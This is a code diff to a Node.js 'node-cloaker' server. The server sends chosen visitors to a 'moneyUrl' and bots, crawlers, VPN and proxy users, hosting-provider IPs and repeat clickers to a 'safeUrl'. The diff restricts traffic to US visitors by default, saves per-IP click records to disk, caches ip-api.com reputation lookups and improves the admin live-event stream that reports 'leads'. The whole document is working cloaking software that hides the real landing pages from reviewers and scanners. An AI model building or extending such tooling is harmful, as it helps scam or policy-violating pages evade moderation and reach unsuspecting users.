@@ -34,7 +34,7 @@ const logEmitter = new EventEmitter();
 logEmitter.setMaxListeners(200);
 
 var SETTINGS_DEFAULTS = {
-  moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: [],
+  moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: ['US'],
   vpnBlocking: true, proxyBlocking: true, botUaBlocking: true,
   repeatClickBlocking: true, ispBlocking: true, countryBlockingEnabled: true,
   suspiciousIspKeywords: [],
@@ -214,6 +214,14 @@ async function initDb() {
         _cacheSettings = Object.assign({}, SETTINGS_DEFAULTS, jSettings);
         dbSaveSettings(_cacheSettings);
       } catch(e) { _cacheSettings = Object.assign({}, SETTINGS_DEFAULTS); }
+    }
+    // ── Startup migration: ensure allowedCountries is never empty ──────────────
+    if (!Array.isArray(_cacheSettings.allowedCountries) || _cacheSettings.allowedCountries.length === 0) {
+      _cacheSettings.allowedCountries = ['US'];
+      _cacheSettings.countryBlockingEnabled = true;
+      dbSaveSettings(_cacheSettings);
+      try { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(_cacheSettings, null, 2)); } catch(e) {}
+      console.log('Settings migration: allowedCountries set to [US]');
     }
 
     // ── Load sites ─────────────────────────────────────────────────────────────
@@ -695,11 +703,43 @@ var ADMIN_PASSWORD_HASH;
   ADMIN_PASSWORD_HASH = bcrypt.hashSync(pwd, 10);
 })();
 
-// ─── Per-IP frequency store (in-memory, 24-hour window) ──────────────────────
+// ─── Per-IP frequency store (in-memory, 24-hour window, persisted to disk) ────
 // Map<ip, lastVisitTimestamp>
 var ipFreqStore = new Map();
 var IP_FREQ_MAX = 10000;
 var IP_FREQ_WINDOW_MS = 24 * 60 * 60 * 1000; // 24 hours
+var FREQ_FILE = path.join(__dirname, 'data', 'freq.json');
+var _freqFlushTimer = null;
+
+// Load frequency store from disk on startup (skip expired entries)
+(function loadFreqStore() {
+  try {
+    var raw = JSON.parse(fs.readFileSync(FREQ_FILE, 'utf8'));
+    var now = Date.now();
+    var loaded = 0;
+    Object.keys(raw).forEach(function(ip) {
+      var ts = raw[ip];
+      if (typeof ts === 'number' && (now - ts) < IP_FREQ_WINDOW_MS) {
+        ipFreqStore.set(ip, ts);
+        loaded++;
+      }
+    });
+    if (loaded > 0) console.log('Loaded ' + loaded + ' frequency entries from disk');
+  } catch(e) { /* file may not exist yet — that is fine */ }
+})();
+
+function scheduleFreqFlush() {
+  if (_freqFlushTimer) return;
+  _freqFlushTimer = setTimeout(function() {
+    _freqFlushTimer = null;
+    try {
+      var obj = {};
+      var cutoff = Date.now() - IP_FREQ_WINDOW_MS;
+      ipFreqStore.forEach(function(ts, ip) { if (ts > cutoff) obj[ip] = ts; });
+      fs.writeFileSync(FREQ_FILE, JSON.stringify(obj));
+    } catch(e) {}
+  }, 30000);
+}
 
 // Map<ip, {ip,country,city,isp,ua,siteId,lastSeen,decision}> — live visitor store
 var activeVisitors = new Map();
@@ -728,6 +768,7 @@ function checkFrequency(ip) {
   if (last && (now - last) < IP_FREQ_WINDOW_MS) {
     // Seen within 24h — it's a repeat click
     ipFreqStore.set(ip, now);
+    scheduleFreqFlush();
     return true;
   }
   // First visit (or >24h ago) — record and allow
@@ -737,11 +778,13 @@ function checkFrequency(ip) {
     ipFreqStore.delete(firstKey);
   }
   ipFreqStore.set(ip, now);
+  scheduleFreqFlush();
   return false;
 }
 
 function clearFrequencyStore() {
   ipFreqStore.clear();
+  try { fs.writeFileSync(FREQ_FILE, '{}'); } catch(e) {}
 }
 
 // ─── Bot / crawler UA blocklist ───────────────────────────────────────────────
@@ -774,6 +817,26 @@ function isSuspiciousISP(isp, org, extraKeywords) {
   return allKeywords.some(function(k) { return k && combined.indexOf(k.toLowerCase()) !== -1; });
 }
 
+// ─── IP reputation cache (in-memory, 24-hour TTL, max 50k entries) ────────────
+var ipCache = new Map();
+var IP_CACHE_TTL = 24 * 60 * 60 * 1000; // 24 hours
+var IP_CACHE_MAX = 50000;
+
+function getIPCache(ip) {
+  var entry = ipCache.get(ip);
+  if (!entry) return null;
+  if (Date.now() > entry.expiry) { ipCache.delete(ip); return null; }
+  return entry.result;
+}
+
+function setIPCache(ip, result) {
+  if (ipCache.size >= IP_CACHE_MAX) {
+    var firstKey = ipCache.keys().next().value;
+    ipCache.delete(firstKey);
+  }
+  ipCache.set(ip, { result: result, expiry: Date.now() + IP_CACHE_TTL });
+}
+
 // ─── IP reputation check via ip-api.com ──────────────────────────────────────
 function checkIP(ip) {
   return new Promise(function(resolve) {
@@ -781,19 +844,24 @@ function checkIP(ip) {
         ip.startsWith('192.168.') || ip.startsWith('172.')) {
       return resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: 'local', org: '' });
     }
+    // Check cache first — avoids ip-api.com rate limits on repeat IPs
+    var cached = getIPCache(ip);
+    if (cached) return resolve(cached);
+
     var opts = {
       hostname: 'ip-api.com',
       path: '/json/' + ip + '?fields=status,country,countryCode,city,regionName,isp,org,proxy,hosting',
       method: 'GET',
       headers: { 'User-Agent': 'node-cloaker/1.0' }
     };
+    var fallback = { proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' };
     var req = http.request(opts, function(res) {
       var data = '';
       res.on('data', function(c) { data += c; });
       res.on('end', function() {
         try {
           var p = JSON.parse(data);
-          resolve({
+          var result = {
             proxy: p.proxy || false,
             hosting: p.hosting || false,
             country: p.countryCode || 'XX',
@@ -801,12 +869,14 @@ function checkIP(ip) {
             regionName: p.regionName || '',
             isp: p.isp || '',
             org: p.org || ''
-          });
-        } catch (e) { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); }
+          };
+          setIPCache(ip, result);
+          resolve(result);
+        } catch (e) { resolve(fallback); }
       });
     });
-    req.on('error', function() { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
-    req.setTimeout(4000, function() { req.destroy(); resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
+    req.on('error', function() { resolve(fallback); });
+    req.setTimeout(4000, function() { req.destroy(); resolve(fallback); });
     req.end();
   });
 }
@@ -1185,22 +1255,31 @@ app.get('/' + ADMIN_PATH + '/events', requireAdmin, function(req, res) {
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
+  res.setHeader('X-Accel-Buffering', 'no'); // disable nginx/Replit proxy buffering
   res.flushHeaders();
 
+  function sseWrite(data) {
+    res.write(data);
+    if (typeof res.flush === 'function') res.flush();
+  }
+
+  // Send immediate confirmation so the client knows the stream is live
+  sseWrite('data: ' + JSON.stringify({ type: 'connected' }) + '\n\n');
+
   function onLog(entry) {
-    res.write('data: ' + JSON.stringify({ type: 'log', entry: entry }) + '\n\n');
+    sseWrite('data: ' + JSON.stringify({ type: 'log', entry: entry }) + '\n\n');
   }
   function onLead(entry) {
-    res.write('data: ' + JSON.stringify({ type: 'lead', entry: entry }) + '\n\n');
+    sseWrite('data: ' + JSON.stringify({ type: 'lead', entry: entry }) + '\n\n');
   }
   function onSiteStatus(payload) {
-    res.write('data: ' + JSON.stringify({ type: 'siteStatus', siteId: payload.siteId, status: payload.status }) + '\n\n');
+    sseWrite('data: ' + JSON.stringify({ type: 'siteStatus', siteId: payload.siteId, status: payload.status }) + '\n\n');
   }
   function onStatsUpdate(payload) {
-    res.write('data: ' + JSON.stringify({ type: 'statsUpdate', todayTotal: payload.todayTotal, todayAllow: payload.todayAllow, todayBlock: payload.todayBlock }) + '\n\n');
+    sseWrite('data: ' + JSON.stringify({ type: 'statsUpdate', todayTotal: payload.todayTotal, todayAllow: payload.todayAllow, todayBlock: payload.todayBlock }) + '\n\n');
   }
   function onVisitorsUpdate(visitors) {
-    res.write('data: ' + JSON.stringify({ type: 'visitorsUpdate', visitors: visitors }) + '\n\n');
+    sseWrite('data: ' + JSON.stringify({ type: 'visitorsUpdate', visitors: visitors }) + '\n\n');
   }
 
   logEmitter.on('newLog', onLog);
@@ -1210,8 +1289,8 @@ app.get('/' + ADMIN_PATH + '/events', requireAdmin, function(req, res) {
   logEmitter.on('visitorsUpdate', onVisitorsUpdate);
 
   var keepAlive = setInterval(function() {
-    res.write(': ping\n\n');
-  }, 25000);
+    sseWrite(': ping\n\n');
+  }, 20000);
 
   req.on('close', function() {
     logEmitter.removeListener('newLog', onLog);
